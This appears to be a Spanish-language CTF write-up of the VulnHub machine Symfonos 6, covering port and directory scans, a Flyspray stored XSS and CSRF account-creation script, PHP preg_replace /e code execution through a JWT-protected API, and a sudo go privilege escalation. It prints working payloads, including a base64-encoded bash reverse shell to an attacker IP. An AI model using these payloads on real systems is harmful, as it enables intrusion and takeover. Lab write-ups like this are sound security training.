---
tags:
  - CTF
  - estado/completo
plataforma: "[[VulnHub]]"
web: https://www.vulnhub.com/symfonos6
dificultad: Media
os: Linux
relacionados:
  - "[[curl]]"
  - "[[Cross-Site Scripting (XSS)]]"
  - "[[CSRF token theft]]"
  - "[[JWT Authentication Abuse]]"
  - "[[Persistence]]"
---
#  VulnHub - Symfonos 6

## Reconocimiento

### Escaneo de puertos y directorios

#### Nmap

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn $(cat ip) -oG logs/ports
```
Uso `extractPorts logs/ports`

```bash
nmap -sCV -p22,80,3000,3306,5000 $(cat ip) -oN logs/deepsca
```

Resultados destacados:
- **80/tcp**: Apache
- **3000/tcp**: Gitea (gestión de repositorios)
- **5000/tcp**: App personalizada (sin endpoints conocidos)

#### Gobuster

```bash
gobuster dir -u "http://$(cat ip)" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -t50 | tee logs/big-dirscan
```

Hallazgos:
- `/posts` → blog propio
- `/flyspray` → Flyspray con un reporte de bug y comentario apuntando al “Achilles’ heel”.


___

## Análisis de vulnerabilidades

### Flyspray y XSS identificado

1. **Version**: Usando nuevamente `gobuster` en el directorio de `flyspray` encuentro la versión del mismo.

2. **Explotación**: Localizo en `ExploitDB` un `XSS` remoto en `Flyspray 1.0-rc4`(Exploit ID 41918).
    
3. **Prueba de concepto**: Registro un usuario con el campo Real Name:
    ```html
    "><script>alert('hola');</script>
    ```
    Al visitar el perfil, el script se dispara correctamente.
>[!TIP]
>Al inspeccionar la web veo que estoy en el campo `value="">`, es por eso que tengo que agregar otra comilla, para que cierre la anterior y salir del campo mencionado.

4. **Comentario**: Dejo un comentario para que el admin lo lea y luego se le inyecte el código. 

### Código del blog con `preg_replace('/.*/e',...)`

En **symfonos_blog/index.php**:

```php
$content = htmlspecialchars($row['text']);
preg_replace('/.*/e', $content, "Win");
```

La bandera `/e` evalúa PHP en el contenido, permitiendo ejecución remota de código si se burla `htmlspecialchars()`.


___

## Explotación de vulnerabilidades

### `xss.js` dirigido al administrador

1. Uso el código de `searchsploit` para cargarlo en mi archivo: 
```php
var tok = document.getElementsByName('csrftoken')[0].value;

var txt = '<form method="POST" id="hacked_form" action="index.php?do=admin&area=newuser">'
txt += '<input type="hidden" name="action" value="admin.newuser"/>'
txt += '<input type="hidden" name="do" value="admin"/>'
txt += '<input type="hidden" name="area" value="newuser"/>'
txt += '<input type="hidden" name="user_name" value="hacker"/>'
txt += '<input type="hidden" name="csrftoken" value="' + tok + '"/>'
txt += '<input type="hidden" name="user_pass" value="12345678"/>'
txt += '<input type="hidden" name="user_pass2" value="12345678"/>'
txt += '<input type="hidden" name="real_name" value="root"/>'
txt += '<input type="hidden" name="email_address" value="root@root.com"/>'
txt += '<input type="hidden" name="verify_email_address" value="root@root.com"/>'
txt += '<input type="hidden" name="jabber_id" value=""/>'
txt += '<input type="hidden" name="notify_type" value="0"/>'
txt += '<input type="hidden" name="time_zone" value="0"/>'
txt += '<input type="hidden" name="group_in" value="1"/>'
txt += '</form>'

var d1 = document.getElementById('menu');
d1.insertAdjacentHTML('afterend', txt);
document.getElementById("hacked_form").submit();
```

2. Inyecto en Real Name:
    ```html
"><script src="http://10.23.58.100:8000/xss.js"></script>
    ```

3. Comparto el script en el directorio donde tengo el fichero:
```python
python3 -m http.server 80
```

4. Accedo por SSH con credenciales `hacker:12345678`.

5. Encuentro un nuevo bug, al entrar contiene las credenciales: `achilles:h2sBr9gryBunKdF9`

### Descargas en Gitea, exploración del código y pruebas. 

Con el usuario `achilles` descargo los repositorios disponibles y los reviso para entender el funcionamiento.

- Veo el archivo: `api.go`
```bash
package api

import (
    "github.com/gin-gonic/gin"
    "symfonos.local/achilles/api/api/v1.0"
)

// ApplyRoutes applies router to gin Router
func ApplyRoutes(r *gin.Engine) {
    api := r.Group("/ls2o4g")
    {
        apiv1.ApplyRoutes(api)
    }
}
```

- Veo el archivo: `v1.0.go`
```bash
package apiv1

import (
    "github.com/gin-gonic/gin"
    "symfonos.local/achilles/api/api/v1.0/auth"
    "symfonos.local/achilles/api/api/v1.0/posts"
)

func ping(c *gin.Context) {
    c.JSON(200, gin.H{
        "message": "pong",
    })
}

// ApplyRoutes applies router to the gin Engine
func ApplyRoutes(r *gin.RouterGroup) {
    v1 := r.Group("/v1.0")
    {
        v1.GET("/ping", ping)
        auth.ApplyRoutes(v1)
        posts.ApplyRoutes(v1)
    }
}
```

- Pruebo: 
```bash
curl -sG "http://172.16.217.165:5000/ls2o4g/v1.0/ping" | jq
```
Veo que responde con `pong`.

Los archivos más importantes para explotar la vulnerabilidad son los que están en las carpetas: `auth` y `posts`.

### Ejecución de código vía API REST

>[!TIP]
El `-H "Content-Type: application/json"` puede evitarse en cada uno de los curls, con usar el format `json` es suficiente.

1. **Obtener token JWT**:
    ```bash
    curl -sX POST  "http://172.16.217.165:5000/ls2o4g/v1.0/auth/login" -H "Content-Type: application/json" -d '{"username": "achilles", "password": "h2sBr9gryBunKdF9"}' | jq
    ```

2. **Prueba de ejecución**:
    ```bash
    curl -sX PATCH "http://172.16.217.165:5000/ls2o4g/v1.0/posts/1" -b "token=…" -H "Content-Type: application/json" -d '{"text": "prueba"}' | jq
    ```

3. **Reverse shell  de `bash` a `base64`**:
    ```bash
    echo "bash -c 'bash -i >& /dev/tcp/172.16.217.148/443 0>&1'" | base64
    ```
    ```
    YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTYuMjE3LjE0OC80NDMgMD4mMScK
	```
    
4. **Deploy reverse shell**:
	Me pongo en escucha: `nc -nlvp 443` y:
	```bash
 curl -s -X PATCH "http://172.16.217.165:5000/ls2o4g/v1.0/posts/1" -b "token=…" -d $'{"text": "system(\'echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTYuMjE3LjE0OC80NDMgMD4mMScK | base64 -d | bash\');"}' | jq
    ```
    

___

## Escalada de privilegios

1. **Persistencia SSH**: Uso `su achilles`.
    
2. **Permiso sudo**:
    ```bash
    sudo -l
    # muestra: NOPASSWD: /usr/local/go/bin/go
    ```
    
3. **Creo archivo que ejecuta comandos de bash en `Go`**: 
	```go
    package main
    import "os/exec"
    func main() {
      exec.Command("chmod","u+s","/bin/bash").Run()
    }
    ```
    
    ```bash
    sudo /usr/local/go/bin/go run pwned.go
    ```
    
4. **Shell root**: Confirmo acceso y leo `/root/proof.txt`.
    

---

## Bandera(s)

> [!FLAG] `flag{Root}`
> Congrats on rooting symfonos:6!
^bandera
